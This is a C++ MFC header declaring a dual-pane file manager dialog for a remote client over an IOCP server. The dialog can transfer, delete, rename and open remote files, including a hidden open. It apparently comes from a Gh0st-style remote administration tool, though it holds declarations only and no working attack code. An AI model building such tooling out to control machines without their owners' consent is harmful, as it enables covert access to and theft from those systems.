#pragma once
#include "TrueColorToolBar.h"
#include "include/IOCPServer.h"
#include "resource.h"


typedef CList<CString, CString&> strList;
// CFileManagerDlg 对话框

class CFileManagerDlg : public CDialog
{
	DECLARE_DYNAMIC(CFileManagerDlg)

public:
	CFileManagerDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // 标准构造函数
	virtual ~CFileManagerDlg();
	bool m_bIsStop;
	CString m_strReceiveLocalFile;
	CString m_strUploadRemoteFile;
	void ShowProgress();
	void SendStop();
	int m_nTransferMode;
	CString m_hCopyDestFolder;
	void SendContinue();
	void SendException();
	void EndLocalRecvFile();
	void EndRemoteDeleteFile();
	CString m_strOperatingFile; // 文件名
	__int64 m_nOperatingFileLength; // 文件总大小
	__int64	m_nCounter;// 计数器
	void WriteLocalRecvFile();
	void CreateLocalRecvFile();
	BOOL SendDownloadJob();
	BOOL SendUploadJob();
	BOOL SendDeleteJob();

	strList m_Remote_Download_Job;
	strList m_Remote_Upload_Job;
	strList m_Remote_Delete_Job;
	CTrueColorToolBar m_wndToolBar_Local;
	CTrueColorToolBar m_wndToolBar_Remote;
	void ShowMessage(char *lpFmt, ...);
	CString m_Remote_Path;
	BYTE m_bRemoteDriveList[1024];
	CString GetParentDirectory(CString strPath);
	void OnReceiveComplete();

	CImageList* m_pImageList_Large;
	CImageList* m_pImageList_Small;

	int m_nNewIconBaseIndex; // 新加的ICON

	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;

	CProgressCtrl* m_ProgressCtrl;
	HCURSOR m_hCursor;
	CString m_Local_Path;
	bool FixedUploadDirectory(LPCTSTR lpPathName);
	void FixedLocalDriveList();
	void FixedRemoteDriveList();
	void FixedLocalFileList(CString directory = "");
	void GetRemoteFileList(CString directory = "");
	void FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen);

	HICON m_hIcon;
	CStatusBar m_wndStatusBar;

	CComboBox	m_Remote_Directory_ComboBox;
	CComboBox	m_Local_Directory_ComboBox;
	CListCtrl	m_list_remote;
	CListCtrl	m_list_local;
// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_FILE };
#endif
	virtual BOOL PreTranslateMessage(MSG* pMsg);
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持
	virtual void PostNcDestroy();
	virtual BOOL OnInitDialog();
	afx_msg HCURSOR OnQueryDragIcon();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnDblclkListLocal(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnBegindragListLocal(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnBegindragListRemote(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg	BOOL OnToolTipNotify(UINT id, NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnMouseMove(UINT nFlags, CPoint point);
	afx_msg void OnLButtonUp(UINT nFlags, CPoint point);
	afx_msg void OnTimer(UINT nIDEvent);
	afx_msg void OnClose();
	afx_msg void OnDblclkListRemote(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnLocalPrev();
	afx_msg void OnRemotePrev();
	afx_msg void OnLocalView();
	afx_msg void OnLocalList();
	afx_msg void OnLocalReport();
	afx_msg void OnLocalBigicon();
	afx_msg void OnLocalSmallicon();
	afx_msg void OnRemoteBigicon();
	afx_msg void OnRemoteList();
	afx_msg void OnRemoteReport();
	afx_msg void OnRemoteSmallicon();
	afx_msg void OnRemoteView();
	afx_msg void OnUpdateLocalStop(CCmdUI* pCmdUI);
	afx_msg void OnUpdateRemoteStop(CCmdUI* pCmdUI);
	afx_msg void OnUpdateLocalPrev(CCmdUI* pCmdUI);
	afx_msg void OnUpdateRemotePrev(CCmdUI* pCmdUI);
	afx_msg void OnUpdateLocalCopy(CCmdUI* pCmdUI);
	afx_msg void OnUpdateRemoteCopy(CCmdUI* pCmdUI);
	afx_msg void OnUpdateRemoteDelete(CCmdUI* pCmdUI);
	afx_msg void OnUpdateRemoteNewfolder(CCmdUI* pCmdUI);
	afx_msg void OnUpdateLocalDelete(CCmdUI* pCmdUI);
	afx_msg void OnUpdateLocalNewfolder(CCmdUI* pCmdUI);
	afx_msg void OnRemoteCopy();
	afx_msg void OnLocalCopy();
	afx_msg void OnLocalDelete();
	afx_msg void OnRemoteDelete();
	afx_msg void OnRemoteStop();
	afx_msg void OnLocalStop();
	afx_msg void OnLocalNewfolder();
	afx_msg void OnRemoteNewfolder();
	afx_msg void OnTransfer();
	afx_msg void OnRename();
	afx_msg void OnEndlabeleditListLocal(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnEndlabeleditListRemote(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnDelete();
	afx_msg void OnNewfolder();
	afx_msg void OnRefresh();
	afx_msg void OnLocalOpen();
	afx_msg void OnRemoteOpenShow();
	afx_msg void OnRemoteOpenHide();
	afx_msg void OnRclickListLocal(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnRclickListRemote(NMHDR* pNMHDR, LRESULT* pResult);
	DECLARE_MESSAGE_MAP()


protected:
	CListCtrl* m_pDragList;		//Which ListCtrl we are dragging FROM
	CListCtrl* m_pDropList;		//Which ListCtrl we are dropping ON
	BOOL		m_bDragging;	//T during a drag operation
	int			m_nDragIndex;	//Index of selected item in the List we are dragging FROM
	int			m_nDropIndex;	//Index at which to drop item in the List we are dropping ON
	CWnd*		m_pDropWnd;		//Pointer to window we are dropping on (will be cast to CListCtrl* type)

	void DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList);
private:
	bool m_bIsUpload; // 是否是把本地主机传到远程上，标志方向位
	bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
	void SendTransferMode();
	void SendFileData();
	void EndLocalUploadFile();
	bool DeleteDirectory(LPCTSTR lpszDirectory);
	void EnableControl(BOOL bEnable = TRUE);
};
